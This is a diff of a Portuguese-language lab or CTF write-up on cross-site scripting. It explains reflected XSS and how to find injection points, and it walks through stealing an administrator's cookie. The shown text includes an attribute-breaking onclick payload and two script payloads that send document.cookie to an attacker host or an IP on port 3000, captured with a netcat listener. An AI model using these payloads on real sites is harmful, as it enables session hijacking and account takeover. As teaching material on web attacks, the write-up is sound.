@@ -20,7 +20,7 @@ Vimos que sites exigem Javascript para funcionar corretamente
 Um usuário mal-intencionado poderia facilmente injetar JavaScript em uma página e executar ações maliciosas  
 Esse tipo de ataque é chamado de XSS; _Cross Site Scripting_  
 
-**Reflected XSS**
+**Reflected XSS**  
 XSS refletido ocorre quando JavaScript arbitrário é refletido de um servidor (e não é permanente)  
 Isso ocorre em cenários como páginas de erro e links onde o payload é passado como uma solicitação e também incluído na resposta  
 O caso mais comum é quando um invasor envia uma URL contendo um payload malicioso para a vítima  
@@ -50,7 +50,7 @@ Assim que um invasor visitar essas páginas, ele poderá simplesmente visualizar
 
 ***
 
-**Requisições**
+**Requisições**  
 Como mencionado acima, extrair um cookie usando uma solicitação é bastante comum  
 Essas solicitações podem ser GET ou POST e geralmente são feitas usando AJAX (Javascript Assíncrono)  
 Isso funciona bem porque o AJAX pode interagir com um servidor em segundo plano (não há necessidade de atualizar ou recarregar uma página)  
@@ -65,7 +65,7 @@ Como alternativa, você pode abrir a ferramenta de desenvolvimento e manter a ab
 
 ***
 
-**Encontrando XSS**
+**Encontrando XSS**  
 Seu payload pode ser adicionado a diferentes aspectos de uma página  
 Um aspecto comum é entre as tags HTML  
 Por exemplo, imagine que um nome de usuário seja adicionado dentro das tags de parágrafo, como: <p> username </p>  
@@ -80,11 +80,12 @@ Para garantir que nosso JavaScript seja executado corretamente, precisamos adici
 Então, o payload correto ficaria assim: link‘ onclick=’alert(1);  
 Que é então inserido da seguinte forma: <a href=’link‘ onclick=’alert(1);’></a>  
 
-# _**Execução**_
+# _**Execução**_  
 Fazendo login no site com o endereço IP, observe que não existe filtro para os comentários  
 Com a ferramenta netcat escutando na porta 80 (HTTP) e baseando-se no script abaixo, monte-se um similar para buscar o cookie de administrador  
 
 <script>window.location = ‘attacker-web-site.com/page?param=’ + document.cookie </script>  
+
 <script>window.location = ‘http://[ip_address]:3000/?=’ + document.cookie </script>  
 
 ![](xss_script_return.jpg)
